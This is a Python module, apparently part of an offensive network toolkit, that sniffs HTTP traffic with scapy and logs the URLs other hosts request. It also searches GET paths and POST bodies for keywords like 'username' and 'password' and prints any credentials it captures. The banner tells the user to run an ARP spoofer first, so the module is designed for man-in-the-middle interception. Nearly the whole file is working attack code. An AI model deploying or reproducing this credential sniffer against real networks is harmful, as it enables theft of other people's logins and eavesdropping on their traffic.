import time
from colorama import init as colorama_init
from colorama import Fore
from colorama import Style

import scapy.all
from scapy.layers import http
import psutil
from prettytable import PrettyTable
import subprocess
import re


def get_current_mac(interface):
	try:
		output = subprocess.check_output(["ifconfig",interface])
		return re.search("\w\w:\w\w:\w\w:\w\w:\w\w:\w\w",str(output)).group(0)
	except:
		pass


def get_current_ip(interface):
    try:
        output = subprocess.check_output(["ifconfig",interface])
        pattern = re.compile(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})')
        output1 = output.decode()    
        ip = pattern.search(output1)[0]
        return ip
    except:
         return None


def ip_table():
    #get all the interface deatils in with psutil in a variable
	addrs = psutil.net_if_addrs()
	t = PrettyTable([f'{Fore.GREEN}Interface','Mac Address',f'IP Address{Style.RESET_ALL}'])
	'''
	old code for ip tables
	Fore.GREEN
	print("{:<34} {:<34} {:<25}".format(f"{Fore.GREEN}Interface{Style.RESET_ALL}",f"{Fore.GREEN}MAC Address{Style.RESET_ALL}",f"{Fore.GREEN}IP Address{Style.RESET_ALL}"))
	Style.RESET_ALL
	k contain the key value i.e. the interfave name
	v contain the value as a list
	for k, v in addrs.items():
		mac = get_current_mac(k)
		ip = get_current_ip(k)
		print(mac)
		print(ip)
		#if the device is connected to the internet the size os the list is more than or = 3 
		if len(v)==3:
			print("{:<25} {:<25} {:<25}".format(k,v[2].address,v[0].address))
		#if it is not then the list size is 1
		else:
			print("{:<25} {:<25}".format(k,v[0].address),f"{Fore.YELLOW}Not on network{Style.RESET_ALL}")
    '''

	for k, v  in addrs.items():
		mac = get_current_mac(k)
		ip = get_current_ip(k)
		if ip and mac:
			t.add_row([k,mac,ip])
		elif mac and ip == None:
			t.add_row([k,mac,f"{Fore.YELLOW}No IP assigned{Style.RESET_ALL}"])
		elif ip:
			t.add_row([k,f"{Fore.YELLOW}No MAC assigned{Style.RESET_ALL}",ip])
	print(t)


choice = "Y"


def sniff(interface):
    #we use scapy to sniff on a particular interface
    #iface is the interface we are sniffing on
    #store is to tell scapy to not to sore the packet intro the memory
    #prn is a funtion that is called ever time whene wver the sniff funtion capture a packet
    #filter="upd" / "arp" / "TCP" / protspecific "port 21" / BPF syntax
    
    #scapy.all.sniff(iface=interface, store=False, prn=process_sniffed_packet,filter="port 80")
    scapy.all.sniff(iface=interface, store=False, prn=process_sniffed_packet)

'''
IMP URL DO NOT REMOVE 

http://www.lucainvernizzi.net/blog/2015/02/12/extracting-urls-from-network-traffic-in-just-9-python-lines-with-scapy-http/

            httplayer= packet.getlayer(http.HTTPRequest)

Raw dump 

            https://stackoverflow.com/questions/44679656/using-scapy-to-fitler-http-packets

'''


def process_sniffed_packet(packet):
    #funtion to monitor the packets
    #we check that the packet hac the layer httprequest
    if packet.haslayer(http.HTTPRequest):
        #if the packet has the http request then we check that it contain the RAW fied of the packet
        print("[+] HTTP REQUEST >>>>>")
        url_extractor(packet)
        test0 = get_login_info_get(packet)
        test = get_login_info(packet)
        if test0:
            print(f"{Fore.GREEN}[+] Username OR password is Send In GET Request >>>> ", test0 ,f"{Style.RESET_ALL}")
        #if get_login_info found some then print those
        if test:
            print(f"{Fore.GREEN}[+] Username OR password is Send In POST Request >>>> ", test ,f"{Style.RESET_ALL}")
        #To Print the raw Packet
        if (choice=="Y" or choice == "y"):
            raw_http_request(packet)


def get_login_info_get(packet):
      try:
        if(packet.haslayer(http.HTTPRequest)):
                path = packet.getlayer(http.HTTPRequest).fields
                path = path["Path"]
                path = path.decode()
                print(path)
                keywords = ["username","user","email","pass","login","password","UserName","Password"]
                for i in keywords:
                    if i in path:
                        return path
      except:
        print("got an exception in get login info GET")
        pass

def get_login_info(packet):
    try:   
        if packet.haslayer(scapy.all.Raw):
                #if it contain the raw fild then print that field post request 
                load = packet[scapy.all.Raw].load
                load_decode = load.decode()
                keywords = ["username","user","email","pass","login","password","UserName","Password"]
                for i in keywords:
                    if i in load_decode:
                        return load_decode
    except:
         print("got an exception in get login info")
         pass


def url_extractor(packet):
    try:
        #get the http layer of the packet
        #packet.show() or packet.summaery()
        http_layer= packet.getlayer('HTTPRequest').fields
        #get the ip layer of the packet 
        ip_layer = packet.getlayer('IP').fields
        #Print them in a readable form 
        print(ip_layer["src"] , "just requested \n" ,http_layer["Method"].decode()," ",http_layer["Host"].decode(), " " ,http_layer["Path"].decode() )
        return
    except:
         print("we got a exception in url extractor ")
         pass

def raw_http_request(packet):
    """
    https://stackoverflow.com/questions/17330139/python-printing-a-dictionary-as-a-horizontal-table-with-headers
    """
    httplayer = packet[http.HTTPRequest].fields
    print("-----------------***Raw HTTP Packet***-------------------")
    print("{:<8} {:<15}".format('Key','Label'))
    try:
        for k, v in httplayer.items():
            try:
                label = v.decode()
            except:
                pass
        
            print("{:<40} {:<15}".format(k,label))  
    except KeyboardInterrupt:
        print("\n[+] Quitting Program...")  
    print("---------------------------------------------------------")
    # TO PRINT A SOLE RAW PACKET UNCOMMNENT THE BELOW LINE
    # print(httplayer)



def main_sniff():
    print(f"{Fore.BLUE}Welcome To Packet Sniffer{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[***] Please Start Arp Spoofer Before Using this Module [***] {Style.RESET_ALL}")
    try:
        global choice
        choice = input("[*] Do you want to to print the raw Packet : Y?N : ")
        ip_table()
        addrs = psutil.net_if_addrs()
        name = []
        for k in addrs.items():
            name.append(k[0])
        interface = input("[*] Please enter the interface name : ")
        if interface in name:
            print("[*] Sniffing Packets...")
            sniff(interface)
        else:
            print(f"{Fore.RED}[!] Invalid Syntax. {Style.RESET_ALL}")
        print(f"{Fore.YELLOW}\n[*] Redirecting to Main Menu...{Style.RESET_ALL}")
        time.sleep(3)
    except KeyboardInterrupt:
        print(f"{Fore.RED}\n[!] Redirecting to Main Menu...{Style.RESET_ALL}")
        time.sleep(3)
